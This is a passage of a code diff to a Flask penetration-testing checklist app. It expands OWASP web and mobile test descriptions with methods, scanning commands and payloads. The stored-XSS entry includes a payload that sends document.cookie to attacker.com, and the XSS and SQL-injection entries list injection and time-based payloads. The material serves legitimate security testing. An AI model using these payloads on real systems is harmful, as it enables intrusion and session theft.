@@ -1,18 +1,27 @@
 import os
-from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
+from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, make_response, send_file
 from flask_sqlalchemy import SQLAlchemy
-from datetime import datetime
+from datetime import datetime, timezone
 import requests
 import json
 import sqlite3
 import ssl
 import urllib3
 from urllib.parse import urlparse, urljoin
+import html
+from markupsafe import Markup
 from dotenv import load_dotenv
 import re
 from bs4 import BeautifulSoup
 import yaml
 from typing import List, Dict
+import pandas as pd
+from openpyxl import Workbook
+from openpyxl.styles import Font, PatternFill, Alignment
+import csv
+import io
+import html
+import re
 import socket
 import base64
 import hashlib
@@ -33,13 +42,42 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 db = SQLAlchemy(app)
 
+# Custom Jinja2 filter for safely formatting test descriptions
+@app.template_filter('safe_format_description')
+def safe_format_description(description):
+    """Safely format test descriptions while preventing XSS"""
+    if not description:
+        return ""
+    
+    # Escape all HTML to prevent XSS
+    escaped = html.escape(description)
+    
+    # Replace line breaks with HTML breaks (safe since we escaped everything)
+    formatted = escaped.replace('\n', '<br>')
+    
+    # Return as Markup object so it's treated as safe HTML
+    return Markup(formatted)
+
+# Custom Jinja2 filter for safely escaping content (redundant but explicit)
+@app.template_filter('safe_escape')
+def safe_escape(content):
+    """Safely escape content to prevent XSS"""
+    if not content:
+        return ""
+    return html.escape(str(content))
+
+# Helper function for timezone-aware UTC datetime
+def utc_now():
+    """Return current UTC time in timezone-aware format"""
+    return datetime.now(timezone.utc)
+
 # Database Models
 class Project(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String(100), nullable=False)
     client_name = db.Column(db.String(100), nullable=False)
     job_type = db.Column(db.String(20), nullable=False)  # 'web', 'mobile_ios', 'mobile_android'
-    created_date = db.Column(db.DateTime, default=datetime.utcnow)
+    created_date = db.Column(db.DateTime, default=utc_now)
     description = db.Column(db.Text)
     urls = db.Column(db.Text)  # JSON string of URLs for web tests
     status = db.Column(db.String(20), default='active')  # 'active', 'completed', 'archived'
@@ -59,8 +97,8 @@ class TestItem(db.Model):
     evidence = db.Column(db.Text)
     risk_level = db.Column(db.String(20))  # 'low', 'medium', 'high', 'critical'
     finding_status = db.Column(db.String(20), default='not_tested')  # 'not_tested', 'pass', 'fail', 'informational'
-    created_date = db.Column(db.DateTime, default=datetime.utcnow)
-    updated_date = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+    created_date = db.Column(db.DateTime, default=utc_now)
+    updated_date = db.Column(db.DateTime, default=utc_now, onupdate=utc_now)
 
 class AutoTestResult(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -71,13 +109,13 @@ class AutoTestResult(db.Model):
     evidence = db.Column(db.Text)
     request_data = db.Column(db.Text)
     response_data = db.Column(db.Text)
-    created_date = db.Column(db.DateTime, default=datetime.utcnow)
+    created_date = db.Column(db.DateTime, default=utc_now)
 
 # Add a simple cache table for OWASP data updates
 class OWASPDataCache(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     data_type = db.Column(db.String(10), nullable=False)  # 'wstg' or 'mstg'
-    last_updated = db.Column(db.DateTime, default=datetime.utcnow)
+    last_updated = db.Column(db.DateTime, default=utc_now)
     data_source = db.Column(db.String(50), default='github')  # 'github' or 'fallback'
     test_count = db.Column(db.Integer, default=0)
 
@@ -193,7 +231,21 @@ class OWASPService:
             if not description_match:
                 description_match = re.search(r'## Description\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
             
-            description = description_match.group(1).strip() if description_match else "Security testing as per OWASP WSTG guidelines."
+            description = description_match.group(1).strip() if description_match else '''Security testing as per OWASP WSTG guidelines.
+
+▼ General Testing Approach:
+• Review application functionality and architecture
+• Identify potential security vulnerabilities
+• Test using manual and automated techniques
+• Document findings with evidence and risk assessment
+• Provide remediation recommendations
+
+▼ Documentation Requirements:
+• Test steps performed and methodology used
+• Evidence of vulnerabilities (screenshots, request/response)
+• Risk assessment and business impact
+• Specific remediation guidance
+• Retest validation after fixes'''
             description = re.sub(r'\n+', ' ', description)[:500] + "..." if len(description) > 500 else description
             
             # Determine category based on the ID
@@ -362,55 +414,277 @@ class OWASPService:
                 'id': 'WSTG-INFO-01',
                 'title': 'Conduct Search Engine Discovery Reconnaissance for Information Leakage',
                 'category': 'Information Gathering',
-                'description': 'Use search engines to discover sensitive information about the application that may be inadvertently exposed.'
+                'description': '''Use search engines to discover sensitive information that may be inadvertently exposed.
+
+▼ What to Test:
+• Search for domain in Google, Bing, DuckDuckGo using site:domain.com
+• Look for exposed files, directories, error messages, stack traces
+• Check for leaked credentials, API keys, internal documentation
+• Search for cached pages that might reveal old/sensitive content
+
+▼ How to Test:
+1. Use Google dorking: site:example.com filetype:pdf OR filetype:doc
+2. Search for: site:example.com "error" OR "exception" OR "stack trace"
+3. Check: site:example.com inurl:admin OR inurl:login OR inurl:config
+4. Use tools like theHarvester, Google Hacking Database (GHDB)
+5. Review search results for sensitive information exposure
+
+▼ Risk Indicators:
+• Database connection strings or credentials in indexed files
+• Error messages revealing file paths or system information
+• Admin interfaces or sensitive directories in search results
+• Cached pages showing outdated or internal content'''
             },
             {
                 'id': 'WSTG-INFO-02',
                 'title': 'Fingerprint Web Server',
                 'category': 'Information Gathering',
-                'description': 'Identify the web server software, version, and configuration to understand potential attack vectors.'
+                'description': '''Identify web server software, version, and configuration to understand potential attack vectors.
+
+▼ What to Test:
+• Server header revealing web server type and version
+• Server-specific response characteristics and error pages
+• Default files and directories that indicate server type
+• Response timing and behavior patterns
+
+▼ How to Test:
+1. Check HTTP response headers: curl -I http://example.com
+2. Send malformed requests to trigger error pages
+3. Check for default files: /server-status, /server-info (Apache)
+4. Use tools: Nmap, Nikto, whatweb, httprint
+5. Banner grabbing: telnet example.com 80, then send HTTP request
+
+▼ Example Commands:
+• nmap -sV -p 80,443 example.com
+• whatweb example.com
+• curl -I -X OPTIONS http://example.com
+
+▼ Risk Indicators:
+• Detailed server version information exposed
+• Default error pages revealing server type
+• Outdated server versions with known vulnerabilities
+• Unnecessary server modules or features enabled'''
             },
             {
                 'id': 'WSTG-INFO-03',
                 'title': 'Review Webserver Metafiles for Information Leakage',
                 'category': 'Information Gathering',
-                'description': 'Analyze robots.txt, sitemap.xml and other metafiles for sensitive information disclosure.'
+                'description': '''Analyze robots.txt, sitemap.xml and other metafiles for sensitive information disclosure.
+
+▼ What to Test:
+• robots.txt file revealing hidden directories and files
+• sitemap.xml exposing site structure and sensitive URLs
+• .well-known directory contents
+• Other metadata files like humans.txt, security.txt
+
+▼ How to Test:
+1. Check robots.txt: curl http://example.com/robots.txt
+2. Review sitemap.xml: curl http://example.com/sitemap.xml
+3. Test .well-known: curl http://example.com/.well-known/security.txt
+4. Look for: crossdomain.xml, clientaccesspolicy.xml
+5. Check for humans.txt, ads.txt, app-ads.txt
+
+▼ Files to Check:
+• /robots.txt - Disallowed paths might reveal sensitive areas
+• /sitemap.xml - Complete site structure mapping
+• /.well-known/security.txt - Security contact information
+• /crossdomain.xml - Flash cross-domain policies
+• /clientaccesspolicy.xml - Silverlight policies
+
+▼ Risk Indicators:
+• Admin areas listed in robots.txt disallow directives
+• Sensitive URLs exposed in sitemap.xml
+• Overly permissive cross-domain policies
+• Information leakage about site structure and hidden content'''
             },
             {
                 'id': 'WSTG-INFO-04',
                 'title': 'Enumerate Applications on Webserver',
                 'category': 'Information Gathering',
-                'description': 'Identify all applications and services running on the web server.'
+                'description': '''Identify all applications and services running on the web server.
+
+▼ What to Test:
+• Virtual hosts and subdomains on the same server
+• Different applications accessible through various paths
+• Services running on non-standard ports
+• Application-specific directories and endpoints
+
+▼ How to Test:
+1. DNS enumeration: dig example.com, dnsrecon -d example.com
+2. Subdomain discovery: sublist3r -d example.com, amass enum -d example.com
+3. Port scanning: nmap -sS -O example.com
+4. Directory enumeration: dirb, gobuster, dirsearch
+5. Virtual host discovery: Host header manipulation
+
+▼ Tools and Commands:
+• nmap -p- example.com (full port scan)
+• gobuster dir -u http://example.com -w /path/to/wordlist
+• ffuf -u http://example.com/FUZZ -w wordlist.txt
+• Use different Host headers to discover virtual hosts
+
+▼ Risk Indicators:
+• Multiple applications with different security levels
+• Forgotten or unmaintained applications
+• Development/staging environments accessible
+• Admin interfaces on non-standard ports'''
             },
             {
                 'id': 'WSTG-INFO-05',
                 'title': 'Review Webpage Content for Information Leakage',
                 'category': 'Information Gathering',
-                'description': 'Examine webpage source code and content for sensitive information exposure.'
+                'description': '''Examine webpage source code and content for sensitive information exposure.
+
+▼ What to Test:
+• HTML comments containing sensitive information
+• JavaScript files with hardcoded credentials or API keys
+• Metadata in images and documents
+• Hidden form fields and disabled elements
+• Source code comments and debug information
+
+▼ How to Test:
+1. View page source: Ctrl+U or curl -s http://example.com
+2. Check JavaScript files: Review all .js files for secrets
+3. Extract metadata: exiftool image.jpg
+4. Search for patterns: grep -r "password\\|api_key\\|secret" ./
+5. Browser developer tools: Network tab, Sources tab
+
+▼ What to Look For:
+• <!-- TODO: remove hardcoded password -->
+• var apiKey = "sk-12345abcdef";
+• Database connection strings in JS
+• Internal IP addresses and server names
+• Debug information and stack traces
+
+▼ Risk Indicators:
+• Hardcoded credentials or API keys in source
+• Internal system information exposed
+• Development comments left in production
+• Sensitive business logic revealed in client-side code'''
             },
             {
                 'id': 'WSTG-CONF-01',
                 'title': 'Test Network Infrastructure Configuration',
                 'category': 'Configuration and Deployment Management Testing',
-                'description': 'Test the network infrastructure configuration for security misconfigurations and vulnerabilities.'
+                'description': '''Test the network infrastructure configuration for security misconfigurations and vulnerabilities.
+
+▼ What to Test:
+• Network service configurations and exposed ports
+• Firewall rules and network segmentation
+• Load balancer and proxy configurations
+• Network protocol security settings
+
+▼ How to Test:
+1. Port scanning: nmap -sS -sV -sC target
+2. Service enumeration: nmap --script=default target
+3. SSL/TLS testing: nmap --script ssl-enum-ciphers -p 443 target
+4. Check for admin interfaces on unusual ports
+5. Test network connectivity and filtering
+
+▼ Common Issues:
+• Unnecessary services running (SSH, FTP, Telnet)
+• Weak SSL/TLS configurations
+• Management interfaces exposed to internet
+• Default credentials on network devices
+• Insecure network protocols (SNMPv1, HTTP)
+
+▼ Tools to Use:
+• Nmap for comprehensive port/service scanning
+• SSLyze for SSL/TLS configuration testing
+• testssl.sh for SSL security assessment
+• Masscan for fast port scanning'''
             },
             {
                 'id': 'WSTG-CONF-02',
                 'title': 'Test Application Platform Configuration',
                 'category': 'Configuration and Deployment Management Testing',
-                'description': 'Verify that the application platform is securely configured according to best practices.'
+                'description': '''Verify that the application platform is securely configured according to best practices.
+
+▼ What to Test:
+• Web server configuration (Apache, Nginx, IIS)
+• Application server settings (Tomcat, JBoss, etc.)
+• Database configuration and access controls
+• Operating system hardening and patch levels
+
+▼ How to Test:
+1. Review web server config files: httpd.conf, nginx.conf
+2. Check for default accounts and passwords
+3. Verify file permissions and ownership
+4. Test directory listings and file access
+5. Review error page configurations
+
+▼ Configuration Areas:
+• Server signature and version disclosure
+• Directory browsing enabled/disabled
+• File upload restrictions and validation
+• Session timeout and security settings
+• Logging and monitoring configurations
+
+▼ Example Checks:
+• curl -I http://example.com (check Server header)
+• Check if http://example.com/uploads/ shows directory listing
+• Verify error pages don't reveal system information
+• Test file upload functionality for bypasses'''
             },
             {
                 'id': 'WSTG-CONF-03',
                 'title': 'Test File Extensions Handling for Sensitive Information',
                 'category': 'Configuration and Deployment Management Testing',
-                'description': 'Test how the web server handles different file extensions and potential information disclosure.'
+                'description': '''Test how the web server handles different file extensions and potential information disclosure.
+
+▼ What to Test:
+• Backup files with common extensions (.bak, .old, .tmp)
+• Source code files (.php.bak, .aspx.cs, .java)
+• Configuration files (.config, .ini, .properties)
+• Archive files (.zip, .tar, .rar) containing source code
+
+▼ How to Test:
+1. Test common backup extensions: file.php.bak, file.php~
+2. Try source code extensions: .cs, .vb, .java for compiled apps
+3. Look for config files: web.config, .htaccess, database.properties
+4. Check for compressed archives: backup.zip, source.tar.gz
+5. Use automated tools: DirBuster, dirb, gobuster
+
+▼ File Extensions to Test:
+• .bak, .backup, .old, .orig, .save, .tmp
+• .inc, .conf, .config, .ini, .properties
+• .cs, .vb, .java (for .NET/Java apps)
+• .zip, .tar, .gz, .rar, .7z
+
+▼ Risk Indicators:
+• Source code files accessible via web
+• Database configuration files exposed
+• Backup files containing sensitive information
+• Development files left on production server'''
             },
             {
                 'id': 'WSTG-CONF-04',
                 'title': 'Review Old Backup and Unreferenced Files for Sensitive Information',
                 'category': 'Configuration and Deployment Management Testing',
-                'description': 'Search for backup files, old versions, and unreferenced files that may contain sensitive information.'
+                'description': '''Search for backup files, old versions, and unreferenced files that may contain sensitive information.
+
+▼ What to Test:
+• Backup files created by editors or deployment scripts
+• Old versions of applications or components
+• Forgotten administrative tools and interfaces
+• Archive files and database dumps
+
+▼ How to Test:
+1. Directory enumeration with backup-focused wordlists
+2. Check common backup locations: /backup/, /old/, /archive/
+3. Look for editor backup files: file.php~, .file.php.swp
+4. Search for database dumps: backup.sql, dump.sql
+5. Use tools like dirb, gobuster with backup extensions
+
+▼ Common Backup Patterns:
+• index.php.bak, login.asp.old
+• backup_20231215.sql, database_dump.sql
+• admin_old/, maintenance/, dev/
+• .DS_Store, Thumbs.db, .svn/, .git/
+
+▼ Tools and Wordlists:
+• SecLists backup file wordlists
+• gobuster with backup extensions: -x bak,old,tmp
+• Find version control directories: /.git/, /.svn/'''
             },
             {
                 'id': 'WSTG-CONF-05',
@@ -470,67 +744,401 @@ class OWASPService:
                 'id': 'WSTG-ATHN-01',
                 'title': 'Testing for Credentials Transported over an Encrypted Channel',
                 'category': 'Authentication Testing',
-                'description': 'Verify that user credentials are transmitted securely over encrypted channels.'
+                'description': '''Verify that user credentials are transmitted securely over encrypted channels.
+
+▼ What to Test:
+• Login forms submit over HTTPS
+• Password reset and change forms use encryption
+• Session tokens transmitted securely
+• No credentials sent in URL parameters or headers over HTTP
+
+▼ How to Test:
+1. Intercept login requests: Use Burp Suite or OWASP ZAP
+2. Check protocol: Ensure login URL starts with https://
+3. Test mixed content: Verify no HTTP resources on HTTPS pages
+4. Check redirect behavior: HTTP login should redirect to HTTPS
+5. Verify secure flag on authentication cookies
+
+▼ Testing Steps:
+• Proxy traffic through Burp/ZAP during login process
+• Check if login form has action="https://..."
+• Look for secure cookie attributes in Set-Cookie headers
+• Test if credentials can be submitted over HTTP
+• Verify no credentials in Referer headers
+
+▼ Risk Indicators:
+• Login forms submitting over HTTP
+• Credentials visible in browser history/logs
+• Session tokens transmitted without encryption
+• Mixed content warnings on authentication pages'''
             },
             {
                 'id': 'WSTG-ATHN-02',
                 'title': 'Testing for Default Credentials',
                 'category': 'Authentication Testing',
-                'description': 'Test for the presence of default or easily guessable credentials in the application.'
+                'description': '''Test for the presence of default or easily guessable credentials in the application.
+
+▼ What to Test:
+• Default admin accounts (admin/admin, admin/password)
+• Vendor-specific default credentials
+• Weak or common passwords
+• Accounts created during installation or setup
+
+▼ How to Test:
+1. Try common username/password combinations
+2. Check vendor documentation for default credentials
+3. Test administrative interfaces and management consoles
+4. Look for installation or setup pages with default accounts
+5. Use credential lists like SecLists default passwords
+
+▼ Common Default Credentials:
+• admin/admin, admin/password, admin/123456
+• root/root, administrator/administrator
+• guest/guest, test/test, demo/demo
+• Application-specific: oracle/oracle, sa/sa
+• Device-specific: Cisco, HP, Dell default passwords
+
+▼ Where to Test:
+• Main application login
+• Administrative interfaces (/admin, /console)
+• Database management tools (phpMyAdmin)
+• Web application firewalls and load balancers
+• Any discovered management interfaces'''
             },
             {
                 'id': 'WSTG-ATHN-03',
                 'title': 'Testing for Weak Lock Out Mechanism',
                 'category': 'Authentication Testing',
-                'description': 'Verify that account lockout mechanisms are properly implemented and cannot be bypassed.'
+                'description': '''Verify that account lockout mechanisms are properly implemented and cannot be bypassed.
+
+▼ What to Test:
+• Account lockout threshold and duration
+• Lockout bypass techniques
+• CAPTCHA implementation effectiveness
+• IP-based vs account-based lockout policies
+
+▼ How to Test:
+1. Attempt multiple failed logins: Test lockout threshold
+2. Try lockout bypasses: IP rotation, user agent changes
+3. Test different usernames: Verify lockout is per-account
+4. Check lockout duration: Time-based vs permanent lockout
+5. Test CAPTCHA: Verify it's properly implemented
+
+▼ Bypass Techniques to Test:
+• IP address rotation using proxies/VPNs
+• Changing User-Agent headers between attempts
+• Using different request formats (POST vs GET)
+• Case variation in usernames (Admin vs admin)
+• Adding extra parameters or headers
+
+▼ Risk Indicators:
+• No account lockout after multiple failed attempts
+• Easy bypass using IP rotation or header changes
+• Lockout mechanism affects only specific login methods
+• CAPTCHA can be easily automated or bypassed'''
             },
             {
                 'id': 'WSTG-SESS-01',
                 'title': 'Testing for Session Management Schema',
                 'category': 'Session Management Testing',
-                'description': 'Analyze the session management implementation for security vulnerabilities.'
+                'description': '''Analyze the session management implementation for security vulnerabilities.
+
+▼ What to Test:
+• Session token generation and randomness
+• Session token length and complexity
+• Session storage mechanism (cookies, URLs, hidden fields)
+• Session lifecycle management
+
+▼ How to Test:
+1. Analyze session tokens: Check randomness and entropy
+2. Test token predictability: Generate multiple sessions, analyze patterns
+3. Check session storage: Look for tokens in URLs or hidden fields
+4. Test session timeout: Verify idle and absolute timeouts
+5. Session regeneration: Check if tokens change after login/privilege escalation
+
+▼ Session Token Analysis:
+• Collect 100+ session tokens and analyze for patterns
+• Check token length: Should be at least 128 bits
+• Test entropy: Use tools like Burp's Sequencer
+• Verify tokens don't contain user information
+• Check for session fixation vulnerabilities
+
+▼ Tools for Testing:
+• Burp Suite Sequencer for randomness analysis
+• OWASP ZAP for session testing
+• Custom scripts to collect and analyze tokens
+• Browser developer tools to inspect session cookies'''
             },
             {
                 'id': 'WSTG-SESS-02',
                 'title': 'Testing for Cookies Attributes',
                 'category': 'Session Management Testing',
-                'description': 'Verify that session cookies have proper security attributes (HttpOnly, Secure, SameSite).'
+                'description': '''Verify that session cookies have proper security attributes (HttpOnly, Secure, SameSite).
+
+▼ What to Test:
+• HttpOnly flag prevents JavaScript access
+• Secure flag ensures HTTPS-only transmission
+• SameSite attribute prevents CSRF attacks
+• Cookie expiration and persistence settings
+
+▼ How to Test:
+1. Inspect Set-Cookie headers: Look for security flags
+2. Test JavaScript access: Try document.cookie in console
+3. Test HTTP/HTTPS behavior: Check if cookies sent over both
+4. Browser testing: Test SameSite behavior across sites
+5. Session persistence: Check if cookies persist after browser close
+
+▼ Required Cookie Attributes:
+• HttpOnly: Prevents XSS cookie theft
+• Secure: Ensures transmission over HTTPS only
+• SameSite=Strict/Lax: Prevents CSRF attacks
+• Appropriate expiration time
+• Path and Domain properly scoped
+
+▼ Testing Methods:
+• Browser Developer Tools → Application → Cookies
+• Burp Suite → Proxy → HTTP History
+• curl -I to check Set-Cookie headers
+• JavaScript console: document.cookie (should not show HttpOnly cookies)'''
             },
             {
                 'id': 'WSTG-SESS-03',
                 'title': 'Testing for Session Fixation',
                 'category': 'Session Management Testing',
-                'description': 'Test for session fixation vulnerabilities in the authentication process.'
+                'description': '''Test for session fixation vulnerabilities in the authentication process.
+
+▼ What to Test:
+• Session token changes after authentication
+• Pre-authentication session tokens accepted post-login
+• Session token regeneration on privilege escalation
+• URL-based session token handling
+
+▼ How to Test:
+1. Obtain session token before login
+2. Login with valid credentials using that token
+3. Check if the same token is valid after login
+4. Test privilege escalation scenarios
+5. Test session token in URLs vs cookies
+
+▼ Testing Steps:
+• Step 1: Visit login page, note session token
+• Step 2: Login with valid credentials
+• Step 3: Check if session token changed after login
+• Step 4: Test if old token still works
+• Step 5: Repeat for privilege escalation scenarios
+
+▼ Vulnerability Indicators:
+• Same session token before and after login
+• Pre-authentication tokens accepted post-login
+• Session tokens passed in URLs can be fixed
+• No token regeneration on role/privilege changes'''
             },
             {
                 'id': 'WSTG-INPV-01',
                 'title': 'Testing for Reflected Cross Site Scripting',
                 'category': 'Input Validation Testing',
-                'description': 'Test for reflected Cross-Site Scripting (XSS) vulnerabilities in user input fields.'
+                'description': '''Test for reflected Cross-Site Scripting (XSS) vulnerabilities in user input fields.
+
+▼ What to Test:
+• URL parameters reflected in response without encoding
+• Form inputs that echo user input back to the page
+• HTTP headers that are reflected in the response
+• Error messages that include user input
+
+▼ How to Test:
+1. Identify reflection points: Find where input appears in output
+2. Test basic payloads: <script>alert(1)</script>
+3. Test encoding bypasses: Use different encoding techniques
+4. Test context-specific payloads: HTML, JavaScript, CSS contexts
+5. Verify execution: Check if JavaScript actually executes
+
+▼ Common Test Payloads:
+• <script>alert("XSS")</script>
+• "><script>alert(1)</script>
+• javascript:alert(1)
+• <img src=x onerror=alert(1)>
+• <svg onload=alert(1)>
+
+▼ Testing Locations:
+• URL parameters: ?q=<script>alert(1)</script>
+• Form fields: Search boxes, contact forms
+• HTTP headers: User-Agent, Referer, X-Forwarded-For
+• File upload filenames and error messages
+
+▼ Encoding Bypasses:
+• URL encoding: %3Cscript%3E
+• HTML entity encoding: &lt;script&gt;
+• Double encoding: %253Cscript%253E
+• Unicode encoding: \\u003cscript\\u003e'''
             },
             {
                 'id': 'WSTG-INPV-02',
                 'title': 'Testing for Stored Cross Site Scripting',
                 'category': 'Input Validation Testing',
-                'description': 'Test for stored Cross-Site Scripting (XSS) vulnerabilities that persist in the application.'
+                'description': '''Test for stored Cross-Site Scripting (XSS) vulnerabilities that persist in the application.
+
+▼ What to Test:
+• Comment sections and user-generated content
+• Profile fields and user settings
+• File upload functionality with stored filenames
+• Any data that persists and is displayed to other users
+
+▼ How to Test:
+1. Identify storage points: Find where data is saved and displayed
+2. Submit XSS payloads: Use various JavaScript injection techniques
+3. Verify persistence: Check if payload survives page reload
+4. Test different user contexts: Admin vs regular user views
+5. Check all locations where stored data appears
+
+▼ High-Impact Locations:
+• User profiles viewed by administrators
+• Comment systems on popular pages
+• Shared documents or collaborative features
+• Email templates or notification systems
+• Error logs viewed by administrators
+
+▼ Advanced Payloads:
+• <script>fetch("/admin").then(r=>r.text()).then(d=>alert(d))</script>
+• <img src=x onerror="new Image().src='//attacker.com/'+document.cookie">
+• <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+• Polyglot payloads that work in multiple contexts
+
+▼ Testing Strategy:
+• Test with different user roles and privileges
+• Check if XSS executes for other users viewing the content
+• Verify payload survives data processing and transformations
+• Test character limits and input validation bypasses'''
             },
             {
                 'id': 'WSTG-INPV-05',
                 'title': 'Testing for SQL Injection',
                 'category': 'Input Validation Testing',
-                'description': 'Test for SQL injection vulnerabilities in database query parameters.'
+                'description': '''Test for SQL injection vulnerabilities in database query parameters.
+
+▼ What to Test:
+• Form inputs that interact with database
+• URL parameters used in database queries
+• HTTP headers processed by database queries
+• Cookie values used in SQL statements
+
+▼ How to Test:
+1. Identify injection points: Find parameters that query database
+2. Test basic payloads: Single quotes, error-based injection
+3. Boolean-based testing: true/false conditions
+4. Time-based testing: Use database sleep functions
+5. Union-based testing: Extract data using UNION SELECT
+
+▼ Basic Test Payloads:
+• ' (single quote) - Check for SQL errors
+• ' OR '1'='1 - Boolean-based testing
+• '; WAITFOR DELAY '00:00:05'-- - Time-based (SQL Server)
+• ' UNION SELECT null,null,null-- - Union-based
+• ' AND 1=1-- vs ' AND 1=2-- - Boolean comparison
+
+▼ Database-Specific Payloads:
+• MySQL: ' AND SLEEP(5)--
+• PostgreSQL: '; SELECT pg_sleep(5)--
+• Oracle: ' AND DBMS_LOCK.SLEEP(5)=1--
+• SQLite: ' AND 1=RANDOMBLOB(100000000)--
+
+▼ Detection Methods:
+• Error messages revealing database structure
+• Different response times indicating time-based injection
+• Different page content for true/false conditions
+• HTTP status code variations
+• Database version and structure information extraction
+
+▼ Tools for Testing:
+• SQLmap for automated testing
+• Burp Suite SQL injection scanner
+• Manual testing with custom payloads
+• OWASP ZAP active scanner'''
             },
             {
                 'id': 'WSTG-ERRH-01',
                 'title': 'Testing for Improper Error Handling',
                 'category': 'Error Handling',
-                'description': 'Verify that error messages do not disclose sensitive information about the application.'
+                'description': '''Verify that error messages do not disclose sensitive information about the application.
+
+▼ What to Test:
+• Stack traces in error messages
+• Database error messages revealing schema information
+• File path disclosures in error responses
+• Debug information in production environment
+
+▼ How to Test:
+1. Trigger application errors: Send malformed input, invalid requests
+2. Test file inclusion errors: Request non-existent files
+3. Database errors: Send SQL injection attempts to trigger DB errors
+4. Test different error scenarios: 404, 500, input validation errors
+5. Check custom vs default error pages
+
+▼ Error Scenarios to Test:
+• Invalid file paths: /app/nonexistent.php
+• Malformed SQL: ' in form fields
+• Invalid file types: Upload .exe to image upload
+• Buffer overflow attempts: Very long input strings
+• Special characters in unexpected places
+
+▼ Information Disclosure Risks:
+• Full file paths: C:\\inetpub\\wwwroot\\app\\config.php
+• Database schema: Table 'users' doesn't exist
+• Framework details: ASP.NET stack traces
+• Internal IP addresses and server names
+• Source code snippets in error messages
+
+▼ Testing Tools:
+• Burp Suite error detection
+• OWASP ZAP error scanner
+• Manual testing with invalid inputs
+• Custom scripts to trigger specific errors'''
             },
             {
                 'id': 'WSTG-CRYP-01',
                 'title': 'Testing for Weak SSL/TLS Ciphers',
                 'category': 'Cryptography',
-                'description': 'Test for weak cryptographic implementations and insecure SSL/TLS configurations.'
+                'description': '''Test for weak cryptographic implementations and insecure SSL/TLS configurations.
+
+▼ What to Test:
+• Supported SSL/TLS protocol versions
+• Cipher suites and their strength
+• Certificate validation and trust chain
+• Perfect Forward Secrecy (PFS) support
+
+▼ How to Test:
+1. SSL/TLS scanning: Use nmap, SSLyze, testssl.sh
+2. Check protocols: Verify SSLv2/v3 and weak TLS are disabled
+3. Cipher analysis: Test for weak and strong cipher suites
+4. Certificate testing: Verify validity, chain, and algorithms
+5. Perfect Forward Secrecy: Check for ECDHE/DHE key exchange
+
+▼ Tools for SSL Testing:
+• nmap --script ssl-enum-ciphers -p 443 target
+• testssl.sh target.com
+• SSLyze --regular target.com:443
+• Qualys SSL Labs online test
+• OpenSSL command line testing
+
+▼ Weak Configurations to Check:
+• SSLv2/SSLv3 protocols (should be disabled)
+• RC4, DES, 3DES ciphers (weak encryption)
+• MD5 and SHA1 certificates (weak hashing)
+• Anonymous cipher suites (no authentication)
+• Export-grade ciphers (deliberately weakened)
+
+▼ Strong Configuration Requirements:
+• TLS 1.2 or 1.3 minimum
+• AES-GCM or ChaCha20-Poly1305 ciphers
+• ECDHE or DHE key exchange (PFS)
+• SHA-256 or better certificate signatures
+• Proper certificate chain validation
+
+▼ Common Vulnerabilities:
+• POODLE (SSLv3 padding oracle)
+• BEAST (CBC cipher vulnerability)
+• CRIME/BREACH (compression attacks)
+• Heartbleed (OpenSSL vulnerability)
+• Logjam (weak Diffie-Hellman)'''
             }
         ]
 
@@ -542,109 +1150,572 @@ class OWASPService:
                 'id': 'MSTG-ARCH-1',
                 'title': 'All app components are identified and known to be needed',
                 'category': 'Architecture, Design and Threat Modeling Requirements',
-                'description': 'Verify that all application components are identified, necessary, and that unused components are removed.'
+                'description': '''Verify that all application components are identified, necessary, and that unused components are removed.
+
+▼ What to Review:
+• Application architecture documentation
+• Third-party libraries and dependencies
+• Unused code and dead functionality
+• Development/debug components in production builds
+
+▼ How to Test:
+1. Code review: Analyze source code for unused imports and functions
+2. Dependency analysis: Check package.json, Podfile, build.gradle
+3. Binary analysis: Use tools to identify included libraries
+4. Network analysis: Monitor app traffic to identify service calls
+5. Static analysis: Use tools to detect dead code
+
+▼ Mobile-Specific Checks:
+• iOS: Check Info.plist for URL schemes and permissions
+• Android: Review AndroidManifest.xml for components and permissions
+• Verify only necessary permissions are requested
+• Check for development certificates in production builds
+
+▼ Tools for Analysis:
+• iOS: otool, class-dump, Hopper Disassembler
+• Android: APKTool, jadx, MobSF
+• Static analysis: SonarQube, Checkmarx
+• Dependency checking: OWASP Dependency Check'''
             },
             {
                 'id': 'MSTG-ARCH-2',
                 'title': 'Security controls are never enforced only on the client side',
                 'category': 'Architecture, Design and Threat Modeling Requirements',
-                'description': 'Ensure that security controls are enforced on a trusted remote endpoint and not solely on the client.'
+                'description': '''Ensure that security controls are enforced on a trusted remote endpoint and not solely on the client.
+
+▼ What to Test:
+• Authentication logic on client vs server
+• Authorization checks and business logic validation
+• Input validation and sanitization
+• Cryptographic operations and key management
+
+▼ How to Test:
+1. Traffic interception: Use proxy tools to modify requests
+2. Client-side bypass: Modify app behavior through debugging
+3. API testing: Call backend APIs directly bypassing client
+4. Business logic testing: Test critical operations through API
+5. Authorization testing: Attempt privilege escalation
+
+▼ Common Client-Side Only Issues:
+• Authentication tokens validated only on client
+• Price calculations done entirely in mobile app
+• User role/permission checks only in UI
+• Sensitive business logic implemented in client code
+• Cryptographic keys hardcoded in the application
+
+▼ Testing Approach:
+• Intercept and modify all client-server communications
+• Test if server validates all client inputs and requests
+• Verify server-side authentication and authorization
+• Check if bypassing client controls affects security
+• Test edge cases and boundary conditions'''
             },
             {
                 'id': 'MSTG-ARCH-3',
                 'title': 'A high-level architecture has been defined and security has been addressed',
                 'category': 'Architecture, Design and Threat Modeling Requirements',
-                'description': 'Verify that a high-level architecture has been defined for the mobile app and all remote services.'
+                'description': '''Verify that a high-level architecture has been defined for the mobile app and all remote services.
+
+▼ What to Review:
+• Architecture diagrams and documentation
+• Data flow diagrams showing sensitive data handling
+• Trust boundaries and security controls
+• Threat modeling and risk assessment documentation
+
+▼ How to Test:
+1. Documentation review: Check for architecture and security docs
+2. Threat model validation: Verify threats have been identified
+3. Security control mapping: Check controls address identified threats
+4. Data flow analysis: Map sensitive data through the system
+5. Attack surface analysis: Identify potential entry points
+
+▼ Architecture Security Elements:
+• Clear definition of trust boundaries
+• Identification of sensitive data and assets
+• Security controls at appropriate layers
